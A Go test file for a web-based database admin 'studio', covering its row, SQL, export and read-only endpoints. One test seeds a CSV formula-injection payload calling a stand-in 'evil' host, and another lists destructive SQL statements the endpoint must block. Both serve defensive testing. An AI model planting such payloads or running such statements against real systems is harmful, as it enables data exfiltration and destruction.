package studio

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/glebarez/sqlite"
	"gorm.io/gorm"
)

func setupTestRouter(t *testing.T) (*gin.Engine, *gorm.DB) {
	t.Helper()
	gin.SetMode(gin.TestMode)

	db, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatalf("failed to open test database: %v", err)
	}
	err = db.AutoMigrate(&TestUser{}, &TestPost{}, &TestTag{})
	if err != nil {
		t.Fatalf("failed to migrate: %v", err)
	}

	// Seed test data
	db.Create(&TestUser{Name: "Alice", Email: "alice@test.com", Active: true})
	db.Create(&TestUser{Name: "Bob", Email: "bob@test.com", Active: false})
	db.Create(&TestUser{Name: "Charlie", Email: "charlie@test.com", Active: true})

	db.Create(&TestTag{Name: "Go"})
	db.Create(&TestTag{Name: "GORM"})

	db.Create(&TestPost{Title: "First Post", Body: "Hello world", AuthorID: 1})
	db.Create(&TestPost{Title: "Second Post", Body: "Another post", AuthorID: 1})
	db.Create(&TestPost{Title: "Third Post", Body: "By Bob", AuthorID: 2})

	router := gin.New()
	models := testModels()

	err = Mount(router, db, models, Config{Prefix: "/studio"})
	if err != nil {
		t.Fatalf("failed to mount studio: %v", err)
	}

	return router, db
}

func doRequest(router *gin.Engine, method, path string, body interface{}) *httptest.ResponseRecorder {
	var req *http.Request
	if body != nil {
		jsonBody, _ := json.Marshal(body)
		req, _ = http.NewRequest(method, path, bytes.NewBuffer(jsonBody))
		req.Header.Set("Content-Type", "application/json")
	} else {
		req, _ = http.NewRequest(method, path, nil)
	}
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	return w
}

func parseJSON(t *testing.T, w *httptest.ResponseRecorder) map[string]interface{} {
	t.Helper()
	var result map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &result); err != nil {
		t.Fatalf("failed to parse JSON response: %v\nbody: %s", err, w.Body.String())
	}
	return result
}

func TestGetSchema(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/schema", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	tables, ok := result["tables"].([]interface{})
	if !ok {
		t.Fatal("expected 'tables' array in response")
	}
	if len(tables) < 3 {
		t.Errorf("expected at least 3 tables, got %d", len(tables))
	}
}

func TestGetRows(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	total := result["total"].(float64)
	if total != 3 {
		t.Errorf("expected 3 total rows, got %v", total)
	}

	rows := result["rows"].([]interface{})
	if len(rows) != 3 {
		t.Errorf("expected 3 rows, got %d", len(rows))
	}
}

func TestGetRowsPagination(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows?page=1&page_size=2", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	result := parseJSON(t, w)
	rows := result["rows"].([]interface{})
	if len(rows) != 2 {
		t.Errorf("expected 2 rows on page 1, got %d", len(rows))
	}

	pages := result["pages"].(float64)
	if pages != 2 {
		t.Errorf("expected 2 pages, got %v", pages)
	}
}

func TestGetRowsSorting(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows?sort_by=name&sort_order=desc", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	result := parseJSON(t, w)
	rows := result["rows"].([]interface{})
	first := rows[0].(map[string]interface{})
	if first["name"] != "Charlie" {
		t.Errorf("expected first row to be Charlie (desc sort), got %v", first["name"])
	}
}

func TestGetRowsSearch(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows?search=alice", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	result := parseJSON(t, w)
	total := result["total"].(float64)
	if total != 1 {
		t.Errorf("expected 1 result for search 'alice', got %v", total)
	}
}

func TestGetRowsFilter(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows?filter_name=Bob", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	result := parseJSON(t, w)
	total := result["total"].(float64)
	if total != 1 {
		t.Errorf("expected 1 result for filter_name=Bob, got %v", total)
	}
}

func TestGetRowsTableNotFound(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/nonexistent/rows", nil)
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestGetRow(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows/1", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	if result["name"] != "Alice" {
		t.Errorf("expected name 'Alice', got %v", result["name"])
	}
}

func TestGetRowNotFound(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows/999", nil)
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestCreateRow(t *testing.T) {
	router, _ := setupTestRouter(t)

	body := map[string]interface{}{
		"name":   "Diana",
		"email":  "diana@test.com",
		"active": true,
	}
	w := doRequest(router, "POST", "/studio/api/tables/test_users/rows", body)
	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}

	// Verify the record was created
	w = doRequest(router, "GET", "/studio/api/tables/test_users/rows?filter_name=Diana", nil)
	result := parseJSON(t, w)
	if result["total"].(float64) != 1 {
		t.Error("expected Diana to be in the database after create")
	}
}

func TestUpdateRow(t *testing.T) {
	router, _ := setupTestRouter(t)

	body := map[string]interface{}{
		"name": "Alice Updated",
	}
	w := doRequest(router, "PUT", "/studio/api/tables/test_users/rows/1", body)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	// Verify the update
	w = doRequest(router, "GET", "/studio/api/tables/test_users/rows/1", nil)
	result := parseJSON(t, w)
	if result["name"] != "Alice Updated" {
		t.Errorf("expected name 'Alice Updated', got %v", result["name"])
	}
}

func TestDeleteRow(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "DELETE", "/studio/api/tables/test_users/rows/3", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	// Verify deletion
	w = doRequest(router, "GET", "/studio/api/tables/test_users/rows/3", nil)
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404 after delete, got %d", w.Code)
	}
}

func TestBulkDelete(t *testing.T) {
	router, _ := setupTestRouter(t)

	body := map[string]interface{}{
		"ids": []interface{}{1, 2},
	}
	w := doRequest(router, "POST", "/studio/api/tables/test_posts/rows/bulk-delete", body)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	affected := result["rows_affected"].(float64)
	if affected != 2 {
		t.Errorf("expected 2 rows affected, got %v", affected)
	}
}

func TestGetRelatedRows(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows/1/relations/Posts", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	total := result["total"].(float64)
	if total != 2 {
		t.Errorf("expected 2 related posts for user 1, got %v", total)
	}
}

func TestGetRelatedRowsNotFound(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows/1/relations/NonExistent", nil)
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestExecuteSQL(t *testing.T) {
	router, _ := setupTestRouter(t)

	body := map[string]interface{}{
		"query": "SELECT name, email FROM test_users ORDER BY id",
	}
	w := doRequest(router, "POST", "/studio/api/sql", body)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	if result["type"] != "read" {
		t.Errorf("expected type 'read', got %v", result["type"])
	}
	total := result["total"].(float64)
	if total != 3 {
		t.Errorf("expected 3 rows, got %v", total)
	}
}

func TestExecuteSQLWrite(t *testing.T) {
	router, _ := setupTestRouter(t)

	body := map[string]interface{}{
		"query": "UPDATE test_users SET active = 1 WHERE id = 2",
	}
	w := doRequest(router, "POST", "/studio/api/sql", body)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	if result["type"] != "write" {
		t.Errorf("expected type 'write', got %v", result["type"])
	}
}

func TestExecuteSQLBlocksDDL(t *testing.T) {
	router, _ := setupTestRouter(t)

	ddlStatements := []string{
		"DROP TABLE test_users",
		"ALTER TABLE test_users ADD COLUMN foo TEXT",
		"TRUNCATE TABLE test_users",
		"CREATE TABLE evil (id int)",
		"ATTACH DATABASE '/tmp/evil.db' AS evil",
	}

	for _, stmt := range ddlStatements {
		w := doRequest(router, "POST", "/studio/api/sql", map[string]interface{}{"query": stmt})
		if w.Code != http.StatusForbidden {
			t.Errorf("DDL statement %q should return 403, got %d", stmt, w.Code)
		}
	}
}

func TestExportJSON(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/export?format=json", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	if ct := w.Header().Get("Content-Type"); ct != "application/json" {
		t.Errorf("expected Content-Type application/json, got %q", ct)
	}

	result := parseJSON(t, w)
	if result["table"] != "test_users" {
		t.Errorf("expected table 'test_users', got %v", result["table"])
	}
}

func TestExportCSV(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/tables/test_users/export?format=csv", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	if ct := w.Header().Get("Content-Type"); ct != "text/csv" {
		t.Errorf("expected Content-Type text/csv, got %q", ct)
	}

	// CSV should have header + data rows
	body := w.Body.String()
	if len(body) == 0 {
		t.Error("expected non-empty CSV body")
	}
}

func TestExportCSVFormulaInjection(t *testing.T) {
	router, db := setupTestRouter(t)

	// Insert a row with formula payload
	db.Exec("INSERT INTO test_users (name, email) VALUES (?, ?)", "=WEBSERVICE(\"http://evil\")", "normal@test.com")

	w := doRequest(router, "GET", "/studio/api/tables/test_users/export?format=csv", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	body := w.Body.String()
	if !strings.Contains(body, "'=WEBSERVICE") {
		t.Errorf("CSV export should prefix formula cells with single quote, got: %s", body)
	}
}

func TestGetDBStats(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/stats", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	if _, ok := result["open_connections"]; !ok {
		t.Error("expected 'open_connections' in stats response")
	}
}

func TestReadOnlyMode(t *testing.T) {
	gin.SetMode(gin.TestMode)

	db, _ := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	db.AutoMigrate(&TestUser{})
	db.Create(&TestUser{Name: "Alice", Email: "alice@test.com"})

	router := gin.New()
	Mount(router, db, testModels(), Config{
		Prefix:   "/studio",
		ReadOnly: true,
	})

	// Read should work
	w := doRequest(router, "GET", "/studio/api/tables/test_users/rows", nil)
	if w.Code != http.StatusOK {
		t.Errorf("GET should work in read-only mode, got %d", w.Code)
	}

	// Write should 404 (route not registered)
	w = doRequest(router, "POST", "/studio/api/tables/test_users/rows", map[string]interface{}{"name": "Bob"})
	if w.Code == http.StatusCreated {
		t.Error("POST should not succeed in read-only mode")
	}

	w = doRequest(router, "DELETE", "/studio/api/tables/test_users/rows/1", nil)
	if w.Code == http.StatusOK {
		t.Error("DELETE should not succeed in read-only mode")
	}

	// SQL write should be blocked in read-only mode
	w = doRequest(router, "POST", "/studio/api/sql", map[string]interface{}{"query": "DELETE FROM test_users"})
	if w.Code != http.StatusForbidden {
		t.Errorf("SQL write should return 403 in read-only mode, got %d", w.Code)
	}

	// SQL read should still work in read-only mode
	w = doRequest(router, "POST", "/studio/api/sql", map[string]interface{}{"query": "SELECT * FROM test_users"})
	if w.Code != http.StatusOK {
		t.Errorf("SQL read should work in read-only mode, got %d", w.Code)
	}
}

func TestDisableSQLMode(t *testing.T) {
	gin.SetMode(gin.TestMode)

	db, _ := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	db.AutoMigrate(&TestUser{})

	router := gin.New()
	Mount(router, db, testModels(), Config{
		Prefix:     "/studio",
		DisableSQL: true,
	})

	body := map[string]interface{}{"query": "SELECT 1"}
	w := doRequest(router, "POST", "/studio/api/sql", body)
	// Should 404 because route is not registered
	if w.Code == http.StatusOK {
		t.Error("SQL should not work when DisableSQL is true")
	}
}

func TestGetConfig(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "GET", "/studio/api/config", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}

	result := parseJSON(t, w)
	if result["prefix"] != "/studio" {
		t.Errorf("expected prefix '/studio', got %v", result["prefix"])
	}
}

func TestRefreshSchema(t *testing.T) {
	router, _ := setupTestRouter(t)

	w := doRequest(router, "POST", "/studio/api/schema/refresh", nil)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	result := parseJSON(t, w)
	if _, ok := result["tables"]; !ok {
		t.Error("expected 'tables' in refresh response")
	}
}

func TestQuoteIdent(t *testing.T) {
	tests := []struct {
		dialect string
		name    string
		want    string
	}{
		{"sqlite", "column_name", `"column_name"`},
		{"postgres", "column_name", `"column_name"`},
		{"mysql", "column_name", "`column_name`"},
		{"sqlite", `col"name`, `"col""name"`},
		{"mysql", "col`name", "`col``name`"},
	}

	for _, tt := range tests {
		t.Run(tt.dialect+"_"+tt.name, func(t *testing.T) {
			got := quoteIdent(tt.dialect, tt.name)
			if got != tt.want {
				t.Errorf("quoteIdent(%q, %q) = %q, want %q", tt.dialect, tt.name, got, tt.want)
			}
		})
	}
}
